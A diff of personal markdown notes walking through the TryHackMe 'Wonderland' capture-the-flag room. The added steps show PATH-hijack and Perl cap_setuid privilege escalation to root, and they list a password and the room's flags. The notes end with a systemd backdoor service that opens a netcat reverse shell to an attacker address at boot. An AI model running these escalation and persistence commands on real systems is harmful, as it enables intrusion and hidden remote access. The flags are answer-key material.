@@ -1,7 +1,7 @@
 # [Wonderland](https://tryhackme.com/room/wonderland)
 
 ```
-export IP=10.10.254.104
+export IP=10.10.14.159
 ```
 
 ---
@@ -65,7 +65,7 @@ export IP=10.10.254.104
 
 	e. SSH doesn't seem to be working and the page seems to be acting funky so I restarted the machine.
 
-	f. Turned out to be my own personal VPN that was causing some issues. Turned it off. Restarted my OpenVPN connection and was able to get an SSH connections.
+	f. That didn't work so I turned off my own personal VPN and restarted the OpenVPN connection and was able to get an SSH connection.
 
 	g. Now that we're in. We run `ls` and see that the `root.txt` file is in alice's home directory. It can't be read, but it's curious as to why it would be there. In fact, it begs the question, is the `user.txt` flag in the root directory? Doesn't hurt to check...
 
@@ -117,4 +117,55 @@ export IP=10.10.254.104
 
 	i. Looks like it's a callout to when something gets executed as the `hatter` user. Another privilege escalation opportunity perhaps??
 
-	j. 
+	j. Created a `bin` folder inside `/home/rabbit` and created an executable named `date` with the following contents:
+	```
+	#!/bin/bash
+	/bin/bash -p
+	```
+
+	k. Next, I exported the new bin folder to the PATH variable:
+	```
+	export PATH=/home/rabbit/bin:$PATH
+	```
+
+	l. Finally, I reran the `teaParty` executable at `/home/rabbit/teaParty` and was able to become the user, `hatter`.
+
+	m. Going to `hatter`'s home directory, I found a `password.txt` file with the string:
+	```
+	WhyIsARavenLikeAWritingDesk?
+	```
+
+	n. Used that password to SSH as `hatter`. For a cleaner shell.
+
+	o. Downloaded `linpeas.sh` on the target and ran it. Found a potential vulnerability:
+	```
+	Files with capabilities (limited to 50):
+	/usr/bin/perl5.26.1 = cap_setuid+ep
+	/usr/bin/mtr-packet = cap_net_raw+ep
+	/usr/bin/perl = cap_setuid+ep
+	```
+
+	p. Googled `cap_setuid perl` and found `https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/`. In it they have the exploit:
+	```
+	perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+	```
+
+	q. AND BOOM! Root baby! Found the root flag @ `/home/alice/root.txt`:
+	```
+	thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
+	```
+
+	r. For fun, I played around with creating different backdoors. I created one using SSH and another using a service that executes at reboot. For the service, this is the code I used (thanks to `https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99`):
+	```
+	# Placed at /etc/systemd/system/backdoor.service
+	[Unit]
+	Description=Very important backdoor.
+
+	[Service]
+	Type=simple
+	ExecStartPre=/bin/mknod /tmp/backpipe p
+	ExecStart=/bin/bash -c '/bin/mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | /bin/nc $MY_IP 1111 1>/tmp/backpipe'
+
+	[Install]
+	WantedBy=multi-user.target
+	```
